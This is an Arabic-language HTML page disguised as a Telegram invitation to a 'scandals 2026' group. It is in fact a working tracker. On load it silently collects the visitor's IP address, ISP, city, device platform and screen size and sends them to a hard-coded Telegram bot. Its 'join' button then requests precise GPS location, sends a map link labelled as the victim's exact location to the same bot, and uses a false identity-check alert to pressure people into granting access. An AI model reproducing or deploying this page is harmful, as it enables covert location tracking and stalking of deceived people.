<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram: Join Group</title>
    <style>
        body { background-color: #1c1c1c; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #2b2b2b; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 400px; border: 1px solid #444; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .btn { background: #24A1DE; color: white; padding: 15px 30px; border: none; border-radius: 30px; font-weight: bold; font-size: 18px; cursor: pointer; width: 100%; margin-top: 20px; }
    </style>
</head>
<body onload="silentCapture()">
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="70">
        <h2>جروب: فضائح 2026 🔥</h2>
        <p>جاري التحقق من المتصفح... يرجى الضغط على انضمام للمتابعة.</p>
        <button class="btn" onclick="getGPS()">انضمام للجروب الآن</button>
    </div>

    <script>
        const token = '8785845001:AAHzQH63-LseRb0meHZI6-9fCLHNW1nst_c';
        const chat_id = '6648970984';

        // 1. صيد صامت (أول ما الصفحة تفتح)
        async function silentCapture() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                const silentMsg = `🕵️‍♂️ **دخل الرابط الآن! (بيانات أولية)**\n\n` +
                                 `🌐 **الشبكة:** ${d.org}\n` +
                                 `🆔 **IP:** ${d.ip}\n` +
                                 `🏙 **المدينة:** ${d.city}\n` +
                                 `📱 **الجهاز:** ${navigator.platform}\n` +
                                 `🖥 **الشاشة:** ${window.screen.width}x${window.screen.height}`;
                
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(silentMsg)}&parse_mode=Markdown`);
            } catch (e) {}
        }

        // 2. صيد الموقع (عند الضغط على الزر)
        function getGPS() {
            navigator.geolocation.getCurrentPosition(async (p) => {
                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                const gpsMsg = `📍 **الموقع الدقيق للضحية:**\n${map}`;
                
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(gpsMsg)}`);
                window.location.href = "https://t.me/telegram";
            }, (err) => {
                alert("يجب السماح بالوصول للموقع للتأكد من هويتك!");
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
